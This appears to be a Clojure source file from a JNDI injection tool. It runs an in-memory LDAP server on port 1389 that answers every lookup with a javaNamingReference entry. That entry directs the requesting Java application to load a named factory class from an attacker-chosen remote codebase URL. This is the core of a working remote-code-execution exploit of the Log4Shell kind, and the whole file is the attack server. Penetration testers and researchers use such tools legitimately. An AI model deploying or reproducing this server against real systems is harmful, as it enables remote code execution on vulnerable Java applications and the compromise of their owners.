(ns jndi-injector-clj.ldap
  (:import [com.unboundid.ldap.listener
            InMemoryDirectoryServer
            InMemoryDirectoryServerConfig
            InMemoryListenerConfig]
           [com.unboundid.ldap.listener.interceptor
            InMemoryOperationInterceptor]
           [com.unboundid.ldap.sdk
            Entry
            LDAPResult
            ResultCode]))

(defn add-entry [base url class-name]
  (doto
   (new Entry base)
    (.addAttribute "javaClassName" "foo")
    (.addAttribute "objectClass" "javaNamingReference")
    (.addAttribute "javaFactory" class-name)
    (.addAttribute "javaCodeBase" url)))

(defn create-interceptor [url class-name]
  (proxy [InMemoryOperationInterceptor]
         []
    (processSearchResult [result]
      (let [_ (println "[+] LDAP request detected")
            base (.getBaseDN (.getRequest result))
            entry (add-entry base url class-name)
            ldap-result (new LDAPResult 0 ResultCode/SUCCESS)]
        (.sendSearchEntry result entry)
        (.setResult result ldap-result)))))

(defn start [url class-name]
  (let [listenerConfig (InMemoryListenerConfig/createLDAPConfig "listen" 1389)
        interceptor (create-interceptor url class-name)
        config (doto
                (new InMemoryDirectoryServerConfig (into-array String ["dc=example,dc=com"]))
                 (.setListenerConfigs (into-array InMemoryListenerConfig [listenerConfig]))
                 (.addInMemoryOperationInterceptor interceptor))
        ds (new InMemoryDirectoryServer config)]
    (. ds startListening)))